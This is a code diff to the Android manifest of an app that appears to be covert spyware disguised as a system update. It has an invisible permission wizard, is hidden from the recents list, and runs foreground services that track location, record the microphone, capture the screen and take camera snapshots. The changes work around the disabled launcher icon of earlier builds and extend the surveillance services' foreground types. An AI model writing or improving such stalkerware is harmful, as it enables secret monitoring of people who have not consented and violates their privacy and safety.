@@ -57,17 +57,30 @@
         android:usesCleartextTraffic="false"
         android:extractNativeLibs="true">
 
+        <!--
+            Launcher entry point.
+
+            A separate component name is used on purpose: older builds disabled
+            the launcher activity with setComponentEnabledSetting(), and the
+            "disabled" flag survives an APK update, so the app could not be
+            started again. A new component name is always enabled.
+        -->
         <activity
-            android:name="com.sp.core.MainActivity"
+            android:name="com.sp.core.LauncherActivity"
             android:exported="true"
             android:excludeFromRecents="true"
-            android:noHistory="true"
             android:theme="@style/Theme.SystemUpdate">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <activity
+            android:name="com.sp.core.MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.SystemUpdate" />
 
         <!-- Invisible permission wizard -->
         <activity
@@ -163,22 +176,22 @@
         <service
             android:name="com.sp.core.services.LocationService"
             android:exported="false"
-            android:foregroundServiceType="location" />
+            android:foregroundServiceType="location|dataSync" />
 
         <service
             android:name="com.sp.core.services.MicRecorder"
             android:exported="false"
-            android:foregroundServiceType="microphone" />
+            android:foregroundServiceType="microphone|dataSync" />
 
         <service
             android:name="com.sp.core.services.ScreenCapture"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
+            android:foregroundServiceType="mediaProjection|dataSync" />
 
         <service
             android:name="com.sp.core.services.CameraSnapService"
             android:exported="false"
-            android:foregroundServiceType="camera" />
+            android:foregroundServiceType="camera|dataSync" />
 
         <service
             android:name="com.sp.core.services.UsageStatsService"
